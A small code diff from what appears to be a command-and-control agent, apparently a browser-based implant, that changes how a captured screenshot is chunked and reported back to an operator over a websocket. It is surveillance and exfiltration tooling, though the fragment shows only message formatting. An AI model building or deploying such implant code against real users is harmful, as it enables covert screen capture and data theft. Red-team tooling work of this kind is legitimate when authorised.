@@ -149,10 +149,12 @@ connection.onmessage = function (e) {
                             let raw = capture.image;
 
                             let resp = {
-                                'chunk_num': 1,
-                                'file_id': response.file_id,
-                                'chunk_data': raw,
                                 'task_id': capture.task_id,
+                                'download': {
+                                    'chunk_num': 1,
+                                    'file_id': response.file_id,
+                                    'chunk_data': raw
+                                }
                             };
 
                             let outer_response = {
@@ -168,9 +170,9 @@ connection.onmessage = function (e) {
 
                             response = {
                                 'task_id':response.task_id,
-                                'user_output':'screencapture complete',
+                                'user_output': '{"agent_file_id":"' + response.file_id + '"}',
                                 'complete':true
-                            };
+                            }
                             
                             outer_response = {
                                 'action':'post_response',
